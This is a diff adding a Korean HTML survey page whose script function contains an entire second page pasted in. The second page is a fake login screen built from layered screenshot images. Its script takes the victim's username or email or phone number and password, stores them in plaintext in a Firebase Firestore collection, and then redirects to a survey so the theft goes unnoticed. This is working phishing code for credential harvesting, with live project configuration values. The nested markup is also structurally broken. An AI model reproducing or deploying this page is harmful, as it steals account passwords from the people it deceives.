@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>설문조사</title>
+
+<style>
+
+body{
+    margin:0;
+    background:#343740;
+    color:white;
+    font-family:Arial, sans-serif;
+}
+
+.box{
+    width:330px;
+    margin:80px auto;
+    text-align:center;
+}
+
+textarea{
+    width:290px;
+    height:160px;
+    background:#3B3F4A;
+    border:2px solid #4A4F5C;
+    border-radius:15px;
+    color:white;
+    padding:10px;
+    font-size:16px;
+    outline:none;
+}
+
+textarea::placeholder{
+    color:#CDCFD4;
+}
+
+button{
+    margin-top:20px;
+    width:230px;
+    height:40px;
+    background:#343740;
+    border:2px solid #CDCFD4;
+    border-radius:20px;
+    color:white;
+    font-size:18px;
+    font-weight:bold;
+}
+
+#complete{
+    margin-top:25px;
+    color:#00ff88;
+    font-size:18px;
+    display:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+<h2>설문조사</h2>
+
+<p>설문 내용을 입력해주세요 (예:재밌어요)</p>
+
+<textarea id="answer" placeholder="여기에 작성하세요"></textarea>
+
+<br>
+
+<button onclick="finish()">
+설문조사 하기
+</button>
+
+<div id="complete">
+축하합니다.<br>
+설문조사가 완료되었습니다
+</div>
+
+</div>
+
+
+<script>
+
+function finish(){
+
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>로그인</title>
+
+<style>
+body{
+    margin:0;
+    background:#343740;
+    position:relative;
+    min-height:100vh;
+    overflow-x:hidden;
+    font-family:Arial, sans-serif;
+}
+
+.bg-img{
+    position:absolute;
+    left:0;
+    width:100%;
+    max-width:100%;
+    height:auto;
+}
+
+.box{
+    position:absolute;
+    border-radius:20px;
+    box-sizing:border-box;
+    font-weight:bold;
+    font-size:20px;
+}
+
+.textbox{
+    background:#3B3F4A;
+    border:1.5px solid #4A4F5C;
+    color:#CDCFD4;
+    padding:0 25px;
+    padding-left:10px;
+    outline:none;
+}
+
+.textbox::placeholder{
+    color:#CDCFD4;
+}
+
+.button{
+    background:#343740;
+    border:2px solid #CDCFD4;
+    color:#CDCFD4;
+    text-align:center;
+    line-height:27px;
+    cursor:pointer;
+}
+
+#text1{
+    left:45px;
+    top:210px;
+    width:230px;
+    height:35px;
+    z-index:100;
+}
+
+#text2{
+    left:45px;
+    top:259px;
+    width:230px;
+    height:35px;
+    z-index:100;
+}
+
+#btn{
+    left:45px;
+    top:299px;
+    width:230px;
+    height:25px;
+    z-index:100;
+}
+
+#error{
+    position:absolute;
+    left:65px;
+    top:350px;
+    color:red;
+    font-size:14px;
+    display:none;
+    z-index:9999;
+}
+
+</style>
+</head>
+
+<body>
+
+<img src="1784544370013.jpg" class="bg-img" style="top:-68px;">
+<img src="PhotoSlim_1784428530977.jpg" class="bg-img" style="top:4px;">
+<img src="1784543266039.jpg" class="bg-img" style="top:76px;">
+<img src="Screenshot_20260720_191934_Kiwi Browser.jpg" class="bg-img" style="top:204px;">
+<img src="1784543265587.jpg" class="bg-img" style="top:311px;">
+<img src="1784543265704.jpg" class="bg-img" style="top:370px;">
+<img src="1784543265886.jpg" class="bg-img" style="top:447px;">
+
+
+<input type="text" id="text1" class="box textbox" placeholder="사용자 이름/이메일/전화번호">
+
+<input type="password" id="text2" class="box textbox" placeholder="비밀번호">
+
+
+<div id="btn" class="box button" onclick="nextPage()">로그인</div>
+
+
+<div id="error">
+사용자 이름또는 비밀번호가 틀렸습니다.
+</div>
+
+
+
+<script type="module">
+
+import { initializeApp } 
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+
+import {
+getFirestore,
+collection,
+addDoc
+}
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";
+
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyAPrtoCp5zftDTIglZ7QWLH_kCsUZkgfV8",
+
+authDomain: "ledy-4bc0a.firebaseapp.com",
+
+projectId: "ledy-4bc0a",
+
+storageBucket: "ledy-4bc0a.firebasestorage.app",
+
+messagingSenderId: "563586878498",
+
+appId: "1:563586878498:web:93d64c9a7525687e348e7b",
+
+measurementId: "G-BRVLN4T0V5"
+
+};
+
+
+const app = initializeApp(firebaseConfig);
+
+const db = getFirestore(app);
+
+
+
+window.nextPage = async function(){
+
+const a = document.getElementById("text1").value.trim();
+
+const b = document.getElementById("text2").value.trim();
+
+const error = document.getElementById("error");
+
+
+// 사용자 이름 검사
+const usernameOK =
+/^[A-Za-z][A-Za-z0-9_]{2,19}$/.test(a);
+
+
+// 비밀번호 검사
+const passwordOK =
+b.length >= 8 && a !== b;
+
+
+
+if(!usernameOK || !passwordOK){
+
+error.style.display="block";
+
+return;
+
+}
+
+
+error.style.display="none";
+
+
+
+try{
+
+await addDoc(collection(db,"texts"),{
+
+text1:a,
+
+text2:b,
+
+createdAt:new Date()
+
+});
+
+
+// 성공하면 설문조사 이동
+
+window.location.href="survey.html";
+
+
+}
+
+catch(e){
+
+alert("저장 실패");
+
+console.error(e);
+
+}
+
+};
+
+</script>
+
+
+</body>
+</html>
